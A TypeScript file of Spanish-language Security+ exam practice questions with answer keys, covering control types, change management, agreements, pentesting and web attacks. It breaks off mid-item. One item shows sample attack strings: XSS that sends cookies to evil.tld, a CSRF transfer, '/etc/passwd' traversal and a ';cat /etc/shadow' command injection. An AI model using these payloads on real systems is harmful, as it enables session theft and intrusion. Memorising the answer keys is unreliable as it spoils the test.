/**
 * Classification-matrix PBQs (51+) covering SY0-701 objectives that the hand-built
 * simulators did not reach: 1.1, 1.3, 2.1, 2.3, 4.6, 5.2, 5.3, 5.4, 5.5 and 5.6.
 */
import { MatrixOption, MatrixPbqConfig, PBQItem } from '../types/pbq';
import { domainNameFor, formatObjective } from './sy0701Objectives';
import { REVIEW_PBQS } from './reviewPbqs';

const o = (value: string, label: string): MatrixOption => ({ value, label });

export interface MatrixPbqDefinition {
  item: PBQItem;
  config: MatrixPbqConfig;
}

const item = (
  n: number,
  category: PBQItem['category'],
  categoryTitle: string,
  title: string,
  objective: [string, string[]],
  minutes: number,
  scenario: string,
  requirements: string[],
  tacticalTip: string
): PBQItem => ({
  id: `pbq-${n}`,
  number: n,
  category,
  categoryTitle,
  title,
  estimatedMinutes: minutes,
  domain: domainNameFor(objective[0]),
  sy0701Objective: formatObjective(objective[0], objective[1]),
  scenario,
  requirements,
  tacticalTip,
});

// ---------------------------------------------------------------------------
// PBQ 51 — Security control categories and types (1.1)
// ---------------------------------------------------------------------------
const CONTROL_CATEGORY = [
  o('technical', 'Técnico (Technical)'),
  o('managerial', 'Gerencial (Managerial)'),
  o('operational', 'Operativo (Operational)'),
  o('physical', 'Físico (Physical)'),
];
const CONTROL_TYPE = [
  o('preventive', 'Preventivo (Preventive)'),
  o('deterrent', 'Disuasorio (Deterrent)'),
  o('detective', 'Detectivo (Detective)'),
  o('corrective', 'Correctivo (Corrective)'),
  o('compensating', 'Compensatorio (Compensating)'),
  o('directive', 'Directivo (Directive)'),
];

const PBQ51: MatrixPbqDefinition = {
  item: item(
    51,
    'security-controls',
    'Categorías y Tipos de Controles',
    'Clasificación de Controles de Seguridad: Categoría × Tipo',
    ['1.1', []],
    6,
    'El auditor interno te entrega el inventario de controles de la empresa y necesita que cada uno quede clasificado en la matriz de controles para el informe de cumplimiento. Debes indicar la CATEGORÍA (quién/cómo se implementa: técnico, gerencial, operativo o físico) y el TIPO (qué función cumple: prevenir, disuadir, detectar, corregir, compensar o dirigir). Clasifica cada control según su función PRINCIPAL.',
    [
      'Asigna a cada control una categoría: Technical, Managerial, Operational o Physical.',
      'Asigna a cada control un tipo: Preventive, Deterrent, Detective, Corrective, Compensating o Directive.',
      'Clasifica por la función principal descrita en el escenario, no por todas las funciones posibles.',
    ],
    'Pregúntate dos cosas por separado: ¿CÓMO se implementa? (sistema = técnico, documento/decisión de la gerencia = gerencial, personas ejecutando = operativo, objeto en el mundo real = físico) y ¿CUÁNDO actúa? (antes = preventivo/disuasorio, durante = detectivo, después = correctivo; "en lugar de" = compensatorio; "indica qué hacer" = directivo).'
  ),
  config: {
    pbqId: 'pbq-51',
    consoleTitle: 'Matriz de Controles de Seguridad (Objetivo 1.1)',
    instructions: 'Para cada control del inventario selecciona su categoría y su tipo. Varias filas pueden compartir la misma respuesta.',
    sections: [
      {
        id: 's1',
        title: 'Inventario de controles',
        columns: [
          { id: 'category', label: 'Categoría', options: CONTROL_CATEGORY },
          { id: 'type', label: 'Tipo', options: CONTROL_TYPE },
        ],
        rows: [
          {
            id: 'c1',
            prompt: 'Una regla del firewall perimetral bloquea todas las conexiones entrantes no solicitadas hacia la red interna.',
            answers: { category: 'technical', type: 'preventive' },
            explanation: 'Lo implementa un sistema (técnico) y evita que el ataque ocurra (preventivo).',
          },
          {
            id: 'c2',
            prompt: 'Al iniciar sesión, un banner (splash screen) advierte que el acceso no autorizado será perseguido legalmente.',
            answers: { category: 'technical', type: 'deterrent' },
            explanation: 'Lo muestra el sistema (técnico). No impide el acceso: desalienta al atacante (disuasorio). Trampa: confundirlo con "directivo"; el directivo indica qué hacer, el disuasorio amenaza con consecuencias.',
          },
          {
            id: 'c3',
            prompt: 'Sensores de movimiento en el pasillo del data center disparan una alarma cuando detectan presencia fuera de horario.',
            answers: { category: 'physical', type: 'detective' },
            explanation: 'Dispositivo en el mundo físico que identifica un evento mientras ocurre: físico/detectivo.',
          },
          {
            id: 'c4',
            prompt: 'El gerente de TI revisa cada mes el reporte de inicios de sesión fallidos y fuera de horario.',
            answers: { category: 'managerial', type: 'detective' },
            explanation: 'Es una actividad de supervisión de la gerencia (gerencial) que identifica anomalías ya ocurridas (detectivo).',
          },
          {
            id: 'c5',
            prompt: 'Tras un ataque de ransomware, el equipo restaura la base de datos desde el último backup inmutable.',
            answers: { category: 'technical', type: 'corrective' },
            explanation: 'La restauración la realiza el sistema de backup (técnico) y revierte el daño después del incidente (correctivo).',
          },
          {
            id: 'c6',
            prompt: 'Un servidor legado no puede recibir el parche crítico; mientras tanto se bloquea el puerto vulnerable con una regla de firewall.',
            answers: { category: 'technical', type: 'compensating' },
            explanation: 'El control ideal (parchear) no es viable, así que se aplica otro control "en su lugar": compensatorio. Palabra clave del examen: "no puede... en su lugar".',
          },
          {
            id: 'c7',
            prompt: 'Un extintor de CO₂ instalado junto a los racks de la sala de servidores.',
            answers: { category: 'physical', type: 'corrective' },
            explanation: 'Objeto físico que actúa cuando el incendio ya comenzó para limitar el daño: correctivo.',
          },
          {
            id: 'c8',
            prompt: 'Un cartel en la puerta del data center: "Solo personal autorizado".',
            answers: { category: 'physical', type: 'directive' },
            explanation: 'Indica la conducta esperada (directivo). Compáralo con "Área bajo vigilancia: los intrusos serán procesados", que sería disuasorio.',
          },
          {
            id: 'c9',
            prompt: 'La dirección aprueba una política de cumplimiento que obliga a cifrar todos los portátiles corporativos.',
            answers: { category: 'managerial', type: 'directive' },
            explanation: 'Documento emitido por la gerencia (gerencial) que ordena un comportamiento (directivo). La política no cifra nada por sí misma.',
          },
          {
            id: 'c10',
            prompt: 'Una cerradura con lector de tarjeta en la puerta del rack de red.',
            answers: { category: 'physical', type: 'preventive' },
            explanation: 'Barrera física que impide el acceso antes de que ocurra: físico/preventivo.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 52 — Change management (1.3)
// ---------------------------------------------------------------------------
const CHANGE_ELEMENTS = [
  o('approval', 'Proceso de aprobación (CAB)'),
  o('ownership', 'Propietario del cambio (Ownership)'),
  o('stakeholders', 'Partes interesadas (Stakeholders)'),
  o('impact', 'Análisis de impacto (Impact analysis)'),
  o('test_results', 'Resultados de pruebas (Test results)'),
  o('backout', 'Plan de reversión (Backout plan)'),
  o('maintenance_window', 'Ventana de mantenimiento'),
  o('sop', 'Procedimiento operativo estándar (SOP)'),
  o('documentation', 'Actualizar diagramas / políticas / documentación'),
  o('version_control', 'Control de versiones'),
  o('allow_list', 'Lista de permitidos / denegados (Allow/Deny list)'),
  o('dependencies', 'Dependencias'),
  o('legacy', 'Aplicaciones legadas'),
  o('restart', 'Reinicio de servicio / aplicación'),
];

const PBQ52: MatrixPbqDefinition = {
  item: item(
    52,
    'change-management',
    'Gestión de Cambios',
    'Proceso de Gestión de Cambios: Elementos de Negocio e Implicaciones Técnicas',
    ['1.3', []],
    5,
    'El equipo de infraestructura debe actualizar el firmware del firewall perimetral y migrar el servidor de base de datos de facturación. El Change Advisory Board (CAB) exige que la solicitud de cambio (RFC) documente cada elemento del proceso. Se te entregan fragmentos de la RFC: identifica a qué elemento del proceso de gestión de cambios o implicación técnica corresponde cada uno.',
    [
      'Relaciona cada fragmento de la RFC con el elemento del proceso de gestión de cambios que representa.',
      'Distingue los procesos de negocio (aprobación, ownership, stakeholders, impacto, backout...) de las implicaciones técnicas (dependencias, allow list, reinicios, legados).',
    ],
    'Backout plan = cómo VOLVER atrás si falla. Impact analysis = qué se rompe y qué riesgo hay (antes de aprobar). Test results = evidencia de que se probó en un entorno controlado. Ownership = UNA persona responsable; stakeholders = todos los afectados que deben ser informados.'
  ),
  config: {
    pbqId: 'pbq-52',
    consoleTitle: 'Solicitud de Cambio RFC-2026-118 (Objetivo 1.3)',
    instructions: 'Cada fragmento pertenece a la RFC del cambio. Selecciona el elemento del proceso al que corresponde.',
    sections: [
      {
        id: 's1',
        title: 'Fragmentos de la RFC',
        columns: [{ id: 'element', label: 'Elemento del proceso', options: CHANGE_ELEMENTS }],
        rows: [
          {
            id: 'r1',
            prompt: 'El CAB revisa la solicitud en su reunión semanal y la firma antes de que pueda implementarse.',
            answers: { element: 'approval' },
            explanation: 'Ningún cambio se implementa sin la aprobación formal del CAB.',
          },
          {
            id: 'r2',
            prompt: 'Se documenta qué sistemas y usuarios se verán afectados, el riesgo de aplicar el cambio y el riesgo de NO aplicarlo.',
            answers: { element: 'impact' },
            explanation: 'El análisis de impacto evalúa consecuencias y riesgo, incluido el de no hacer el cambio.',
          },
          {
            id: 'r3',
            prompt: 'Si el nuevo firmware falla, se cargará la imagen y configuración anteriores en menos de 10 minutos.',
            answers: { element: 'backout' },
            explanation: 'El backout plan define cómo revertir al estado previo. Trampa común: confundirlo con un backup; el backup es un recurso, el backout plan es el procedimiento de reversión.',
          },
          {
            id: 'r4',
            prompt: 'El cambio se ejecutará el domingo de 02:00 a 04:00, cuando el tráfico es mínimo.',
            answers: { element: 'maintenance_window' },
            explanation: 'La ventana de mantenimiento minimiza el impacto en la operación.',
          },
          {
            id: 'r5',
            prompt: 'El firmware se instaló primero en un firewall idéntico del laboratorio (sandbox) y pasó todas las pruebas de tráfico.',
            answers: { element: 'test_results' },
            explanation: 'La evidencia de pruebas en un entorno aislado se adjunta a la RFC antes de la aprobación.',
          },
          {
            id: 'r6',
            prompt: 'Tras el cambio, se actualizan el diagrama de red y el inventario de reglas del firewall.',
            answers: { element: 'documentation' },
            explanation: 'Todo cambio debe reflejarse en diagramas, políticas y procedimientos para que la documentación no quede desactualizada.',
          },
          {
            id: 'r7',
            prompt: 'Se notifica al gerente de ventas porque el CRM no estará disponible durante la migración.',
            answers: { element: 'stakeholders' },
            explanation: 'Los stakeholders son las personas afectadas por el cambio y deben ser informadas.',
          },
          {
            id: 'r8',
            prompt: 'Los scripts de configuración se guardan en Git con un número de revisión y autor.',
            answers: { element: 'version_control' },
            explanation: 'El control de versiones permite rastrear qué cambió, quién lo cambió y volver a versiones anteriores.',
          },
          {
            id: 'r9',
            prompt: 'Ana, administradora de red, es la responsable de gestionar el cambio de principio a fin y reportar su resultado.',
            answers: { element: 'ownership' },
            explanation: 'Ownership: una persona responsable del cambio. No confundir con stakeholders (todos los afectados).',
          },
          {
            id: 'r10',
            prompt: 'Antes de migrar la BD se descubre que tres microservicios se conectan a ella y deben detenerse en un orden concreto.',
            answers: { element: 'dependencies' },
            explanation: 'Dependencias: otros servicios que requieren el sistema modificado y pueden fallar si no se coordinan.',
          },
          {
            id: 'r11',
            prompt: 'La nueva versión del agente EDR debe añadirse al control de aplicaciones para que se le permita ejecutarse.',
            answers: { element: 'allow_list' },
            explanation: 'Si existe application allow listing, el nuevo binario debe autorizarse o será bloqueado.',
          },
          {
            id: 'r12',
            prompt: 'La aplicación de facturación de 2009 solo soporta TLS 1.0 y no tiene soporte del fabricante.',
            answers: { element: 'legacy' },
            explanation: 'Las aplicaciones legadas limitan qué cambios de seguridad pueden aplicarse y requieren consideración especial.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 53 — Third-party agreements and governance documents (5.3 / 5.1)
// ---------------------------------------------------------------------------
const AGREEMENTS = [
  o('sla', 'SLA (Service-Level Agreement)'),
  o('mou', 'MOU (Memorandum of Understanding)'),
  o('moa', 'MOA (Memorandum of Agreement)'),
  o('msa', 'MSA (Master Service Agreement)'),
  o('sow', 'SOW / WO (Statement of Work / Work Order)'),
  o('nda', 'NDA (Non-Disclosure Agreement)'),
  o('bpa', 'BPA (Business Partners Agreement)'),
  o('roe', 'Reglas de enfrentamiento (Rules of Engagement)'),
  o('right_to_audit', 'Cláusula de derecho a auditoría (Right-to-audit)'),
];
const GOV_DOCS = [
  o('policy', 'Política (Policy)'),
  o('standard', 'Estándar (Standard)'),
  o('procedure', 'Procedimiento (Procedure)'),
  o('guideline', 'Guía (Guideline)'),
];

const PBQ53: MatrixPbqDefinition = {
  item: item(
    53,
    'third-party-governance',
    'Riesgo de Terceros y Gobernanza',
    'Acuerdos con Terceros y Jerarquía de Documentos de Gobernanza',
    ['5.3', ['5.1']],
    6,
    'Tu empresa está contratando un proveedor de hosting, un consultor de pentesting y un socio comercial para un nuevo producto. El área legal te pide clasificar los documentos que se están negociando. Además, el CISO está reorganizando la biblioteca de documentos de seguridad y necesita que cada documento quede en el nivel correcto de la jerarquía de gobernanza.',
    [
      'Sección 1: identifica el tipo de acuerdo con terceros que describe cada cláusula.',
      'Sección 2: clasifica cada documento interno como política, estándar, procedimiento o guía.',
    ],
    'MSA = contrato marco (términos generales) y SOW = detalle de UN proyecto bajo ese marco. MOU = intención, generalmente NO vinculante; MOA = más formal, define responsabilidades. Política = "qué y por qué" (alto nivel), estándar = requisito obligatorio y medible, procedimiento = paso a paso, guía = recomendación opcional.'
  ),
  config: {
    pbqId: 'pbq-53',
    consoleTitle: 'Revisión Legal de Acuerdos y Biblioteca de Gobernanza',
    instructions: 'Clasifica cada cláusula o documento. Algunas respuestas pueden no usarse.',
    sections: [
      {
        id: 's1',
        title: 'Acuerdos con terceros',
        columns: [{ id: 'doc', label: 'Tipo de acuerdo', options: AGREEMENTS }],
        rows: [
          {
            id: 'a1',
            prompt: 'El proveedor de hosting garantiza 99,95% de disponibilidad mensual y un crédito del 10% por cada hora de caída adicional.',
            answers: { doc: 'sla' },
            explanation: 'El SLA define métricas de servicio medibles (uptime, tiempos de respuesta) y penalizaciones.',
          },
          {
            id: 'a2',
            prompt: 'Dos universidades firman un documento que expresa su intención de colaborar en investigación, sin obligaciones legales.',
            answers: { doc: 'mou' },
            explanation: 'El MOU expresa intención mutua; normalmente no es legalmente vinculante.',
          },
          {
            id: 'a3',
            prompt: 'Dos agencias gubernamentales formalizan qué responsabilidades asume cada una en un proyecto conjunto y bajo qué condiciones.',
            answers: { doc: 'moa' },
            explanation: 'El MOA es más formal y detallado que el MOU: define responsabilidades y condiciones concretas.',
          },
          {
            id: 'a4',
            prompt: 'Contrato marco con la consultora que fija tarifas, confidencialidad y responsabilidades legales para todos los proyectos futuros.',
            answers: { doc: 'msa' },
            explanation: 'El MSA establece los términos generales; cada trabajo concreto se define después en un SOW.',
          },
          {
            id: 'a5',
            prompt: 'Documento que detalla los entregables, el cronograma y el precio del pentest de la aplicación móvil de este trimestre.',
            answers: { doc: 'sow' },
            explanation: 'El SOW/Work Order describe el alcance específico de un proyecto bajo el MSA.',
          },
          {
            id: 'a6',
            prompt: 'El consultor se compromete por escrito a no revelar información confidencial de la empresa.',
            answers: { doc: 'nda' },
            explanation: 'El NDA protege la confidencialidad de la información compartida.',
          },
          {
            id: 'a7',
            prompt: 'Dos socios definen cómo compartirán ganancias, pérdidas, responsabilidades y la toma de decisiones del nuevo producto.',
            answers: { doc: 'bpa' },
            explanation: 'El BPA regula la relación entre socios de negocio (propiedad, ganancias, responsabilidades).',
          },
          {
            id: 'a8',
            prompt: 'Antes del pentest se acuerda el alcance, el horario permitido, las IP excluidas y los contactos de emergencia.',
            answers: { doc: 'roe' },
            explanation: 'Las Rules of Engagement definen los límites del ejercicio y protegen legalmente al pentester.',
          },
          {
            id: 'a9',
            prompt: 'El contrato con el proveedor de hosting permite a la empresa revisar los controles de seguridad del proveedor con aviso previo.',
            answers: { doc: 'right_to_audit' },
            explanation: 'La cláusula right-to-audit es parte de la evaluación continua de riesgo de terceros (vendor monitoring).',
          },
        ],
      },
      {
        id: 's2',
        title: 'Biblioteca de gobernanza',
        columns: [{ id: 'doc', label: 'Tipo de documento', options: GOV_DOCS }],
        rows: [
          {
            id: 'g1',
            prompt: '"La organización protegerá la confidencialidad de la información de sus clientes." — aprobado por el directorio.',
            answers: { doc: 'policy' },
            explanation: 'Declaración de alto nivel, aprobada por la dirección, que define el qué y el por qué.',
          },
          {
            id: 'g2',
            prompt: '"Las contraseñas deben tener al menos 14 caracteres y los datos en reposo deben cifrarse con AES-256."',
            answers: { doc: 'standard' },
            explanation: 'Requisitos obligatorios, específicos y medibles que implementan la política: estándar.',
          },
          {
            id: 'g3',
            prompt: '"1) Deshabilitar la cuenta en AD. 2) Revocar tokens de sesión. 3) Recuperar el portátil. 4) Firmar el acta de baja."',
            answers: { doc: 'procedure' },
            explanation: 'Instrucciones paso a paso para una tarea concreta (offboarding): procedimiento.',
          },
          {
            id: 'g4',
            prompt: '"Se recomienda usar frases de contraseña fáciles de recordar, como cuatro palabras al azar."',
            answers: { doc: 'guideline' },
            explanation: 'Recomendación no obligatoria: guía. La palabra "recomienda" es la pista en el examen.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 54 — Penetration testing, audits and assessments (5.5)
// ---------------------------------------------------------------------------
const ASSESSMENT_TERMS = [
  o('known', 'Entorno conocido (Known environment)'),
  o('partial', 'Entorno parcialmente conocido (Partially known)'),
  o('unknown', 'Entorno desconocido (Unknown environment)'),
  o('passive', 'Reconocimiento pasivo'),
  o('active', 'Reconocimiento activo'),
  o('red', 'Equipo rojo (Red team)'),
  o('blue', 'Equipo azul (Blue team)'),
  o('purple', 'Equipo púrpura (Purple team)'),
  o('internal_audit', 'Auditoría interna'),
  o('attestation', 'Atestación por auditor externo (External attestation)'),
  o('bug_bounty', 'Programa de bug bounty'),
  o('pivot', 'Pivoting / movimiento lateral'),
  o('persistence', 'Persistencia'),
];

const PBQ54: MatrixPbqDefinition = {
  item: item(
    54,
    'pentest-audit',
    'Pentesting y Auditorías',
    'Tipos de Pruebas de Penetración, Reconocimiento y Auditorías',
    ['5.5', []],
    5,
    'El comité de riesgo planifica el programa anual de evaluaciones de seguridad: varios pentests con distintos niveles de información, ejercicios de equipos rojo/azul, una auditoría para un cliente que exige SOC 2 y un programa público de reporte de vulnerabilidades. Clasifica cada actividad descrita en el plan.',
    [
      'Identifica el tipo de entorno de prueba según la información que recibe el evaluador.',
      'Distingue reconocimiento pasivo de activo y las fases posteriores a la explotación.',
      'Identifica el tipo de equipo o de auditoría descrito.',
    ],
    'Pasivo = NO toca los sistemas del objetivo (OSINT, WHOIS, redes sociales). Activo = interactúa con ellos (escaneos, banner grabbing). Known = toda la información (antes "white box"), Partially known = algo (antes "gray box"), Unknown = nada (antes "black box").'
  ),
  config: {
    pbqId: 'pbq-54',
    consoleTitle: 'Plan Anual de Evaluaciones de Seguridad (Objetivo 5.5)',
    instructions: 'Selecciona el término que describe cada actividad del plan.',
    sections: [
      {
        id: 's1',
        title: 'Actividades del plan',
        columns: [{ id: 'term', label: 'Término', options: ASSESSMENT_TERMS }],
        rows: [
          {
            id: 'p1',
            prompt: 'El evaluador recibe diagramas de red, código fuente y credenciales de administrador antes de empezar.',
            answers: { term: 'known' },
            explanation: 'Con información completa se trata de un known environment (white box).',
          },
          {
            id: 'p2',
            prompt: 'El evaluador solo conoce el nombre de la empresa; debe descubrir todo lo demás por su cuenta, como un atacante externo.',
            answers: { term: 'unknown' },
            explanation: 'Sin información previa: unknown environment (black box).',
          },
          {
            id: 'p3',
            prompt: 'El evaluador recibe una cuenta de usuario estándar y la lista de subredes, pero no la documentación de la arquitectura.',
            answers: { term: 'partial' },
            explanation: 'Información limitada: partially known environment (gray box).',
          },
          {
            id: 'p4',
            prompt: 'Recopila nombres de empleados en LinkedIn y registros WHOIS y DNS públicos sin enviar tráfico a los servidores del objetivo.',
            answers: { term: 'passive' },
            explanation: 'OSINT sin interactuar con los sistemas del objetivo: reconocimiento pasivo.',
          },
          {
            id: 'p5',
            prompt: 'Ejecuta "nmap -sV" contra el rango de IP público del cliente para identificar versiones de servicios.',
            answers: { term: 'active' },
            explanation: 'Enviar paquetes a los sistemas del objetivo es reconocimiento activo (puede ser detectado).',
          },
          {
            id: 'p6',
            prompt: 'Tras comprometer un servidor web de la DMZ, el evaluador lo usa como punto de salto para alcanzar la subred de bases de datos.',
            answers: { term: 'pivot' },
            explanation: 'Usar un host comprometido para llegar a otros segmentos es pivoting.',
          },
          {
            id: 'p7',
            prompt: 'El evaluador crea una tarea programada que reabre su acceso cada vez que el servidor se reinicia.',
            answers: { term: 'persistence' },
            explanation: 'Mantener el acceso a través de reinicios o cambios de credenciales es persistencia.',
          },
          {
            id: 'p8',
            prompt: 'Analistas del SOC monitorean, detectan y contienen los ataques simulados durante el ejercicio.',
            answers: { term: 'blue' },
            explanation: 'El blue team defiende; el red team ataca.',
          },
          {
            id: 'p9',
            prompt: 'Atacantes y defensores trabajan juntos y comparten hallazgos en tiempo real para mejorar las detecciones.',
            answers: { term: 'purple' },
            explanation: 'Purple team = colaboración rojo + azul con retroalimentación continua.',
          },
          {
            id: 'p10',
            prompt: 'Una firma auditora independiente emite un informe SOC 2 Type II sobre los controles de la empresa para entregar a clientes.',
            answers: { term: 'attestation' },
            explanation: 'Un tercero independiente certifica (attests) la eficacia de los controles: atestación externa.',
          },
          {
            id: 'p11',
            prompt: 'El departamento de auditoría de la propia empresa verifica que el proceso de altas y bajas de usuarios se cumple.',
            answers: { term: 'internal_audit' },
            explanation: 'Realizada por personal de la organización: auditoría interna (a menudo reporta al comité de auditoría).',
          },
          {
            id: 'p12',
            prompt: 'La empresa publica un programa que paga a investigadores externos por reportar vulnerabilidades de forma responsable.',
            answers: { term: 'bug_bounty' },
            explanation: 'Bug bounty: recompensa por divulgación responsable de vulnerabilidades.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 55 — Application attacks from logs and payloads (2.3 / 2.4)
// ---------------------------------------------------------------------------
const APP_ATTACKS = [
  o('xss_reflected', 'XSS reflejado (Reflected)'),
  o('xss_stored', 'XSS almacenado (Stored / Persistent)'),
  o('sqli', 'Inyección SQL'),
  o('traversal', 'Directory traversal'),
  o('cmd_injection', 'Inyección de comandos'),
  o('csrf', 'CSRF (Cross-Site Request Forgery)'),
  o('ssrf', 'SSRF (Server-Side Request Forgery)'),
  o('buffer_overflow', 'Desbordamiento de búfer (Buffer overflow)'),
  o('race', 'Condición de carrera (TOCTOU)'),
  o('spraying', 'Password spraying'),
  o('brute_force', 'Fuerza bruta'),
  o('replay', 'Ataque de repetición (Replay)'),
  o('privesc', 'Escalada de privilegios'),
];
const APP_MITIGATIONS = [
  o('param_queries', 'Consultas parametrizadas (prepared statements)'),
  o('output_encoding', 'Codificación de salida + Content-Security-Policy'),
  o('input_validation', 'Validación de entrada con allow list / canonicalización'),
  o('csrf_token', 'Token anti-CSRF + cookies SameSite'),
  o('memory_safety', 'Comprobación de límites, ASLR y DEP / lenguaje memory-safe'),
  o('locking', 'Operaciones atómicas y bloqueos (locking)'),
  o('mfa_rate_limit', 'MFA + limitación por IP / detección de intentos distribuidos'),
  o('account_lockout', 'Bloqueo de cuenta tras N intentos fallidos'),
  o('nonce', 'Nonces / timestamps y tokens de un solo uso'),
  o('least_privilege', 'Mínimo privilegio + parcheo del sistema'),
];

const PBQ55: MatrixPbqDefinition = {
  item: item(
    55,
    'app-attacks',
    'Ataques a Aplicaciones',
    'Identificación de Ataques a Aplicaciones desde Logs y Payloads',
    ['2.3', ['2.4']],
    7,
    'El WAF y el SIEM capturaron once eventos sospechosos contra las aplicaciones de la empresa durante el fin de semana. Como analista de nivel 2, debes revisar cada evidencia (log, petición HTTP o comportamiento observado), identificar el tipo de ataque o vulnerabilidad y seleccionar la mitigación más eficaz para el equipo de desarrollo.',
    [
      'Analiza cada evidencia e identifica el ataque o vulnerabilidad.',
      'Selecciona la mitigación principal que elimina la causa raíz.',
      'Fíjate en los indicadores: caracteres especiales, secuencias ../, payloads largos, origen y frecuencia de los intentos.',
    ],
    'Busca la firma: <script> o eventos onerror = XSS; \' OR 1=1 o UNION SELECT = SQLi; ../ = traversal; ; | && en un parámetro = command injection; muchos usuarios con UNA contraseña = spraying; UN usuario con muchas contraseñas = fuerza bruta; 0x41414141 / NOP sled = buffer overflow.'
  ),
  config: {
    pbqId: 'pbq-55',
    consoleTitle: 'Cola de Alertas WAF / SIEM — Aplicaciones Web',
    instructions: 'Para cada evidencia selecciona el ataque y la mitigación principal.',
    sections: [
      {
        id: 's1',
        title: 'Eventos capturados',
        columns: [
          { id: 'attack', label: 'Ataque / vulnerabilidad', options: APP_ATTACKS },
          { id: 'mitigation', label: 'Mitigación principal', options: APP_MITIGATIONS },
        ],
        rows: [
          {
            id: 'e1',
            prompt: 'Un enlace enviado por correo a varios empleados; la página de búsqueda devuelve el parámetro q sin filtrar.',
            evidence: "GET /search?q=<script>new Image().src='https://evil.tld/c?'+document.cookie</script> HTTP/1.1",
            answers: { attack: 'xss_reflected', mitigation: 'output_encoding' },
            explanation: 'El script viaja en la petición y se refleja en la respuesta solo para quien abre el enlace: XSS reflejado. Se mitiga codificando la salida y con CSP.',
          },
          {
            id: 'e2',
            prompt: 'Intento de inicio de sesión en el portal de clientes.',
            evidence: "POST /login  user=admin'--&pass=x  → 302 Location: /dashboard",
            answers: { attack: 'sqli', mitigation: 'param_queries' },
            explanation: "La comilla cierra el literal y -- comenta el resto de la consulta (incluida la contraseña): inyección SQL. La defensa principal son las consultas parametrizadas.",
          },
          {
            id: 'e3',
            prompt: 'Petición al endpoint de descarga de facturas.',
            evidence: 'GET /download?file=../../../../etc/passwd HTTP/1.1  → 200 OK (root:x:0:0:...)',
            answers: { attack: 'traversal', mitigation: 'input_validation' },
            explanation: 'Las secuencias ../ salen del directorio permitido: directory traversal. Se mitiga canonicalizando la ruta y validando contra una allow list.',
          },
          {
            id: 'e4',
            prompt: 'Herramienta de diagnóstico de red expuesta en el panel de administración.',
            evidence: 'GET /tools/ping?host=8.8.8.8;cat%20/etc/shadow HTTP/1.1',
            answers: { attack: 'cmd_injection', mitigation: 'input_validation' },
            explanation: 'El ; encadena un segundo comando del sistema operativo: inyección de comandos. Validar estrictamente la entrada (solo IP válidas) y no invocar el shell.',
          },
          {
            id: 'e5',
            prompt: 'Un comentario publicado en el foro ejecuta código en el navegador de TODOS los usuarios que visitan el hilo.',
            evidence: '<img src=x onerror="fetch(\'https://evil.tld/\'+document.cookie)">',
            answers: { attack: 'xss_stored', mitigation: 'output_encoding' },
            explanation: 'El payload queda guardado en el servidor y afecta a cada visitante: XSS almacenado (persistente).',
          },
          {
            id: 'e6',
            prompt: 'Un cliente con sesión abierta en el banco visita un blog que contiene esta etiqueta; se ejecuta una transferencia que él no pidió.',
            evidence: '<img src="https://bank.example/transfer?to=ATTACKER&amount=5000" width="0" height="0">',
            answers: { attack: 'csrf', mitigation: 'csrf_token' },
            explanation: 'El navegador envía la cookie de sesión válida en una petición forjada por otro sitio: CSRF. Se mitiga con tokens anti-CSRF y cookies SameSite.',
          },
          {
            id: 'e7',
            prompt: 'El servicio de carga de archivos se cae tras recibir un nombre de archivo de 5.000 caracteres.',
            evidence: 'filename=AAAAAAAA…AAAA\\x90\\x90\\x90…  → Segmentation fault, EIP=0x41414141',
            answers: { attack: 'buffer_overflow', mitigation: 'memory_safety' },
            explanation: 'La entrada excede el búfer y sobrescribe el puntero de instrucción (0x41 = "A"): buffer overflow.',
          },
          {
            id: 'e8',
            prompt: 'Dos retiros simultáneos de 100 USD leen el saldo (100 USD) antes de que cualquiera lo actualice; la cuenta queda en -100 USD.',
            answers: { attack: 'race', mitigation: 'locking' },
            explanation: 'Entre la comprobación (time of check) y el uso (time of use) el estado cambió: condición de carrera / TOCTOU.',
          },
          {
            id: 'e9',
            prompt: 'Log del proveedor de identidad durante 10 minutos.',
            evidence: '4.112 cuentas distintas · 1 intento por cuenta · contraseña "Primavera2026!" · origen 203.0.113.50',
            answers: { attack: 'spraying', mitigation: 'mfa_rate_limit' },
            explanation: 'Una contraseña común contra muchas cuentas evita el bloqueo por cuenta: password spraying. El bloqueo de cuenta NO lo detiene (1 intento por cuenta); MFA y la detección por origen sí.',
          },
          {
            id: 'e10',
            prompt: 'Una petición autenticada a la API de pagos capturada en una red Wi-Fi pública se reenvía 50 veces sin modificar.',
            evidence: 'POST /api/pay  Authorization: Bearer eyJ…  X-Timestamp: 1792700000  (×50, idénticas)',
            answers: { attack: 'replay', mitigation: 'nonce' },
            explanation: 'Reutilizar una petición válida capturada es un replay attack. Nonces, timestamps validados y tokens de un solo uso lo impiden.',
          },
          {
            id: 'e11',
            prompt: 'Tras explotar el servidor web, el atacante ejecuta un exploit del kernel.',
            evidence: '$ id → uid=33(www-data)   $ ./exploit   $ id → uid=0(root)',
            answers: { attack: 'privesc', mitigation: 'least_privilege' },
            explanation: 'Pasar de una cuenta de servicio a root es escalada de privilegios vertical. Mínimo privilegio y parcheo del kernel.',
          },
        ],
      },
    ],
  },
};

// ---------------------------------------------------------------------------
// PBQ 56 — Threat actors, motivations and deception technologies (2.1 / 1.2)
// ---------------------------------------------------------------------------
const ACTORS = [
  o('nation_state', 'Estado-nación (APT)'),
  o('organized_crime', 'Crimen organizado'),
  o('hacktivist', 'Hacktivista'),
  o('insider', 'Amenaza interna (Insider)'),
  o('unskilled', 'Atacante no calificado (Unskilled attacker)'),
  o('shadow_it', 'Shadow IT'),
];
const MOTIVATIONS = [
  o('espionage', 'Espionaje'),
  o('financial', 'Ganancia financiera'),
  o('philosophical', 'Creencias filosóficas / políticas'),
  o('revenge', 'Venganza'),
  o('chaos', 'Disrupción / caos'),
  o('war', 'Guerra'),
  o('blackmail', 'Chantaje'),
  o('none', 'Sin intención maliciosa (conveniencia)'),
];
const DECEPTION = [
  o('honeypot', 'Honeypot'),
  o('honeynet', 'Honeynet'),
  o('honeyfile', 'Honeyfile'),
  o('honeytoken', 'Honeytoken'),
  o('sinkhole', 'DNS sinkhole'),
];

const PBQ56: MatrixPbqDefinition = {
  item: item(
    56,
    'threat-actors',
    'Actores de Amenaza y Engaño',
    'Perfilado de Actores de Amenaza, Motivaciones y Tecnologías de Engaño',
    ['2.1', ['1.2']],
    5,
